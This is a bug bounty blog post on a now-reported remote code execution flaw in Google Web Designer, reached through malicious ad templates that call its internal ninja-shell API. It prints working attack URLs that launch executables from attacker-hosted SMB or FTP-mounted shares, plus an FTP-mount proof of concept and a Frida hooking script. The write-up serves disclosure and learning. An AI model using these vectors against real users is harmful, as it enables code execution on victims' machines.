---
layout: post
title: Abusing the NinjaShell API for Code Execution in Google Web Designer
description: "Technical breakdown of a Remote Code Execution vulnerability in Google Web Designer via a malicious Video Ad Template abusing the NinjaShell API."
tag:
- bugbounty
- xss
- google
- rce
image: "/tmp/cdn-images//vlc_F5uL7S9FCj.png" # If you have a banner image
---


Heyyy Everyone,

*Google Web Designer* has been on my radar for quite some time because of this person: <https://balintmagyar.com>
. He has been finding so many cool RCEs in this single desktop application, which made me so interested to look into it and try to find one myself.

When someone puts out a blogpost, rather than just reading it, I always try to reproduce it. If it’s possible to set up an older version of the same app, I’ll do that and try to reproduce the bug. This is actually very important because sometimes some bugs are much harder in practice than they seem just from reading the blogpost. Doing this gives you more understanding of the application, which helps in finding similar bugs in other areas or even bypasses of the same bug.

For Google Web Designer as well, it’s the same. Bálint Magyar put out a bunch of blogposts:

<br/>
<center><a
  href="https://balintmagyar.com/articles/google-web-designer-symlink-client-side-rce-cve-2025-1079"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

<br/>
<center><a
  href="https://balintmagyar.com/articles/google-web-designer-path-traversal-client-side-rce-cve-2025-4613"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

Just by reading and reproducing these bugs, you start to get an idea of the attack surface and where you can look for potential entry points.

Since we’re targeting a desktop application and not a normal web app, the input sources need to be identified first. In such cases, it’s most often the exported project files themselves that you can open in the application.

One such input was a malicious ad template package, which you can import into the application and use.

<img  alt="image" src="/tmp/cdn-images/Code_mexdtuaT5a.png" />
<img  alt="image" src="/tmp/cdn-images/Code_V2lQVX6KH5.png" />


Bálint’s exploit was through the `remoteAssets` key, where he discovered a URL parsing behavior that made *Google Web Designer (GWD)* fetch resources from an arbitrary origin. I started out by looking for any bypasses of the same issue but didn’t have much success. So, I decided to look into similar inputs instead.

Just above the `remoteAssets` key, you can see three similarly named keys that also contain URLs as their values:

```json
      "videoThumbnailUrlSmall": "https://storage.googleapis.com/gwd_video_templates/thumbnail_videos/Multisize_Video_With_Text_Panel_Overlay_And_Logo_6s_300x168.mp4",
      "videoThumbnailUrlLarge": "https://storage.googleapis.com/gwd_video_templates/thumbnail_videos/Multisize_Video_With_Text_Panel_Overlay_And_Logo_6s_600x338.mp4",
      "videoPreviewRootUrl": "https://storage.googleapis.com/gwd_video_templates/preview_videos/Multisize_Video_With_Text_Panel_Overlay_And_Logo_6s",
```

I simply replaced the values for these keys with my own webhook URL, and soon enough I received a pingback when I loaded that template:

```http
GET /?body=%3Cscript%3Efetch(%27/xss%27)%3C/script%3E HTTP/1.1
Host: yvyedbhvbnmwsqqztgnyw7fw0o04kd4fu.oast.fun
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Accept-Encoding: gzip, deflate, br
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: video
Accept-Language: en-US,en;q=0.9
Range: bytes=0-
Connection: keep-alive
```

From the `Sec-Fetch-Dest` header, it’s clear that my URL was being loaded inside a video element’s src attribute. My initial thought was that if it were being loaded in a new window or an iframe instead, it could provide a script execution primitive and since the Chromium version used here is old, renderer exploits could potentially lead to direct RCE.

At this point, I tried to see if I could access the developer console. GWD uses the Chromium Embedded Framework (CEF), which is evident from the User-Agent. If I could find a way to debug the page (which is basically HTML/JS), I might be able to escalate this further.

I attempted to use Frida to hook into the process and inject remote debugging flags into the renderer processes, but they didn’t seem to work for me. Below is a sample hooking script I created with ChatGPT to try injecting `--remote-debugging-port`, but for some reason, it never worked:


```js
// File: debug_renderers_proper.js
let rendererCount = 0;
const BASE_PORT = 9222;

console.log("[+] Starting proper argument injection...");

const APIs = [
    { name: "CreateProcessW", module: "kernel32.dll" },
    { name: "CreateProcessInternalW", module: "kernelbase.dll" }
];

APIs.forEach(api => {
    const address = Module.findExportByName(api.module, api.name);
    if (address) {
        Interceptor.attach(address, {
            onEnter: function(args) {
                try {
                    const cmdLinePtr = args[1];
                    if (!cmdLinePtr.isNull()) {
                        let originalCmd = cmdLinePtr.readUtf16String();
                        
                        if (originalCmd.includes("--type=renderer") && 
                            !originalCmd.includes("--remote-debugging-port")) {
                            
                            rendererCount++;
                            const debugPort = BASE_PORT + rendererCount - 1;
                            
                            // PROPER POSITIONING: Insert before /prefetch:
                            const prefetchIndex = originalCmd.indexOf("/prefetch:");
                            let newCmd = originalCmd;
                            
                            if (prefetchIndex !== -1) {
                                newCmd = 
                                    originalCmd.substring(0, prefetchIndex) + 
                                    ` --remote-debugging-port=${debugPort} ` +
                                    originalCmd.substring(prefetchIndex);
                            } else {
                                newCmd = originalCmd + ` --remote-debugging-port=${debugPort}`;
                            }
                            
                            // Clean up any double spaces
                            newCmd = newCmd.replace(/\s+/g, ' ').trim();
                            
                            const newCmdPtr = Memory.allocUtf16String(newCmd);
                            
                            console.log(
                                `\n[+] Modified renderer #${rendererCount}\n` +
                                `Port: ${debugPort}\n` +
                                `Before: ${originalCmd}\n` +
                                `After : ${newCmd}\n` +
                                "-".repeat(60)
                            );
                            
                            args[1] = newCmdPtr;
                        }
                    }
                } catch (e) {
                    console.error(`Error in ${api.name}:`, e);
                }
            }
        });
    }
});

console.log("\n[+] Ready - Start debugging at:\n" +
            `http://localhost:${BASE_PORT}\n` +
            `http://localhost:${BASE_PORT + 1}`);
```


This felt like a dead end, as I was only able to load my own domain by controlling the video src. I then started exploring other video templates available by default, and in one of them, I noticed something very interesting…


```json
     "videoThumbnailUrlSmall": "//ninja-shell/api/file?method=read&file=C:%5CUsers%5CSTARK-PC%5CDocuments%5CGoogle%20Web%20Designer%5Ctemplates%5Cdefaults%5CpreviewVideos%5Ca.mp4",
      "videoThumbnailUrlLarge": "//ninja-shell/api/file?method=read&file=C:%5CUsers%5CSTARK-PC%5CDocuments%5CGoogle%20Web%20Designer%5Ctemplates%5Cdefaults%5CpreviewVideos%5Ca.mp4",
      "videoPreviewRootUrl": "//ninja-shell/api/file?method=read&file=C:%5CUsers%5CSTARK-PC%5CDocuments%5CGoogle%20Web%20Designer%5Ctemplates%5Cdefaults%5CpreviewVideos%5Ca",
```

I had once noticed a mention of ninja-shell while proxying the application traffic through Burp. At first, it looked like just a random path to me, but after seeing the full URL, it turned out to be something very interesting.

```
//ninja-shell/api/file?method=read&file=C:\Users\STARK-PC\Documents\Google Web Designer\templates\defaults\previewVideos\a.mp4
```

Simply treat this as a URL ninja-shell is the hostname, which is resolved internally by the application. There are some request listeners that, upon detecting this hostname, handle the request differently.
This meant I could make any request to the ninja-shell host, but since I don’t control the method, I’m limited to GET requests only.

I started enumerating more endpoints by checking the proxied JS files and also ran a simple strings command on the binary, grepping for “ninja” (hehe inspired from Renwa <https://medium.com/@renwa/arc-browser-uxss-local-file-read-arbitrary-file-creation-and-path-traversal-to-rce-b439f2a299d1>)


```
googleclient/webdesigner/shell/cef_objects/ninja_cef_client.cc
googleclient/webdesigner/shell/cef_objects/ninja_cef_app.cc
ninjaShell
```

Based on the naming of the file you can get an idea this ninja api allows the GWD to communicate with CEF

```
//ninja-shell/api/preference?method=get
//ninja-shell/api/preference?method=read
//ninja-shell/api/browser?method=list
//ninja-shell/api/browser?method=open&url=&usedefaultapp=true
```

Out of the ones I found, this one caught my interest: `//ninja-shell/api/browser?method=open&url=&usedefaultapp=true`. Specifying any URL there opens it in the default browser. I quickly changed it to `file:///C:/Windows/System32/calc.exe` to see if it popped Calculator  and it worked :)

To execute an arbitrary binary, we can make the victim visit an attacker-controlled website first, have the victim download an executable from there, and then specify that executable’s location in the url parameter of the ninja-shell API. There is one limitation: the attacker needs to know the victim’s username beforehand because the Download folder is constructed like this: `C:\Users\STARK-PC\Downloads\pwn.exe`  the username can be anything.

I hoped the same url parameter would resolve SMB paths as well. I changed it to `\\<IP>\pwn.exe`, but it didn’t work.

I didn’t have many options left, so I decided to report it as-is for now and continue looking for different ways. I started searching for ninjaShell on Google to see if it’s part of some library or known component, and I stumbled upon a disclosed report  this is exactly what I was looking for, damnnn.

<br/>
<center><a
  href="https://bughunters.google.com/reports/vrp/qMhY4nw9i"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

TLDR: Earlier GWD exposed a local server (Chrome Devtools Protocol) via the `--remote-debugging-port` flag. You can enumerate available endpoints via `/json/list`, and from there leak the *webSocketDebuggerUrl* for pages loaded in that Chrome process.

<br/>
<center><a
  href="https://chromedevtools.github.io/devtools-protocol/"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

Sample response:

```json
[ {
  "description": "",
  "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734",
  "id": "DAB7FB6187B554E10B0BD18821265734",
  "title": "Yahoo",
  "type": "page",
  "url": "https://www.yahoo.com/",
  "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734"
} ]
```

Being able to leak `webSocketDebuggerUrl` means you can connect to that websocket and execute any arbitrary commands in the context of the loaded page. In the above example by connecting to that websocket you will able be to execute arbitrary js in the <https://www.yahoo.com/> origin.

With DNS rebinding it would be possible to leak such url, but the main concern is how would you connect to it. In older versions it was possible to connect to this websocket port from any origin,but it got some nice mitigations in place to avoid such. 

The only possible ways to connect to websocket now are either you have some sort script execution (xss) in the  origin specified in `--remote-allow-origins` flag (`*` in this flag means any origin is allowed :p) , another way is to remove the `Origin` header or not sent it at all for the handshake request. Browsers normally always send Origin, so this is hard.

I am aware about only one case where it was possible to do such, it used to work in Firefox. I do sure know a lot of people who are waiting for such to happen because it's been used a sole measure to protect againsts CSRF as well 😆.

Actually there were two ways I found one by mistake, I loaded a csrf poc locally so the scheme was `file://` this made the Firefox browser not send any Origin header at all for any requests. 

I submitted the report as it is (was for a private bbp CSRF bug) and realised later that the same poc would fail in real world when the attacker would host such in their own website. The solution for this I found on twitter can't find the tweet now , someone found by embedding a data-URI HTML form CSRF PoC inside an iframe src  attribute you can make the browser to not send any Origin header.

But shortly after, this stopped working in newer versions of Firefox too, then I saw this disclosed report at that time he used the same poc and did confirm that it no longer works in newer versions :( 

<br/>
<center><a
  href="https://x.com/disclosedh1/status/1679139895883833348"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

-----------------

Ah so we took an unexpected turn back to GWD again, in that disclosed Google VRP report the researcher showed they are able to make requests to the `ninja-shell` host 

This gives the following primitive:

```
Read / Write / Delete / List any file and folder the victim system user has access to. This is possible as Google Web Designer implements some special APIs which are triggered when you fetch a https://ninja-shell/api/{file|directory}?method={read|create|save|delete|exists|...}&{file|path}= URL
```

The same endpoints also supports different methods eg PUT request can be used to write arbitrary files on the victim machines and as you are able to view the response of the request also you have file read primitive as well.

I am limited to GET based method only, so I couldn't use the PUT method for arbitrary file write and get RCE using it.

Meanwhile I got the BOUNTY mail for my report, the amount was way lower than the previous RCEs found in the same application

<img  alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 172310.png" />

Google VRP is actually really nice, they give details on any factor which might have affected the bounty amount. It's good because you can argue and provide more impact to overcome that downgrade medium.

```
We applied a downgrade because the attack requires significant user interaction.
We applied a downgrade because of a minor impact the attack may have.
We applied a downgrade, determining that the issue is very likely unexploitable due to knowing information about the victims machine.
```

The  bounty which Bálint Magyar recieved for his RCE bug was 8.5k which relied on the same Malicous Ad Template, so I wondered -5k just for this limitation where the attacker needs to know the username doesn't looks justified ? I appealed for the same asking Google to increase the bounty.


I tried asking on twitter as well, maybe someone knows a way. @Jorian did responded and provided some good ideas  but that didn't turned out to be useful for those case.

<img  alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 174929.png" />

So in the end I had no other option for Windows, but later I stumbled upon this disclosed report from @RenwaX23.

<br/>
<center><a
  href="https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

From his poc

```html
<body>
<br><br>
<h1 style=color:green onclick=start()>
Click Here and confirm the dialog boxes to connect
</h1>
<script>
function start(){
location='ftp://tinnier-regions:slawbra23@files.000webhost.com';
setTimeout(()=>{
location='https://app.asana.com/-/desktop_app_link?path=/file:///Volumes/files.000webhost.com/public_html/pwn.html'
},10000)
}

</script>
```

On macOS, if a webpage navigates to the `ftp:` scheme using location, the Finder dialog box appears  clicking Open will automatically mount the share in an easily guessable location on the victim’s file system.

```
file:///Volumes/files.000webhost.com/public_html/pwn.html
```



<br/>
<center><a
  href="https://github.com/Metnew/write-ups/tree/main/rce-github-desktop-2.9.3"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

I included these additional details in my reports, showing that the username requirement could be bypassed. After some time, I received this response 🥲. It seems they considered that there could be many bugs if users open or rely on such malicious templates, and the best way to handle this is simply to warn the user before opening untrusted templates.

This concept is similar to what Vscode does, where they would prompt and ask if the user trusts the workspace or not if it's not trusted the directory is opened in a kindof sandbox environment where it disables a lot of vscode internal/extension features eg git,etc that might unknowingly allow executing arbitrary commands.

<img  alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 193104.png"/>


In the end, it turned out like this  you can consider that they won't accept such bugs anymore in Google Web Designer.

<img  alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 194328.png"/>

Just a couple of weeks after my report was closed, I saw this banger from Bálint once again: it turns out he found the same type of bug but the sink was different. For me it was `video.src` in his case he injected the ninja-shell API URL in the `background-image` property, which when rendered makes a request to that specific URL.

 <br/>
<center><a
  href=" https://balintmagyar.com/articles/google-web-designer-css-injection-client-rce"
  class="card-preview"
  data-size="medium"
  target="_blank">
  Loading preview...
</a></center>
<br/>

The RCE vector which he used was really cool, it clearly shows how I missed such. Every bug we miss is an oppurtunity to learn more :)


The vector which I was using for RCE:

```
//ninja-shell/api/browser?method=open&url=/Volumes/attackerserver.com/public_html/pwn.exe&usedefaultapp=true
```

The one  used by Bálint:

```
//ninja-shell/api/browser?method=open&usedefaultapp=false&browser=chrome&url=//%22%20--browser-subprocess-path%3D%5C%5Cbalintmagyar.com%5Cpayload.exe%20--headless%20%22
```

You can notice the similarities the path endpoint is same, only difference is in the parameters which I totally failed to find about during my esalation this involves arguement injection in the chrome process + using SMB share to deliver the executable , so props to Bálint on finding this 🫡

<center>
<iframe width="560" height="315" src="https://www.youtube.com/embed/494MSLeW7n8?si=l9HtKiizcn6Y2LQU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</center>
<br/>
<br/>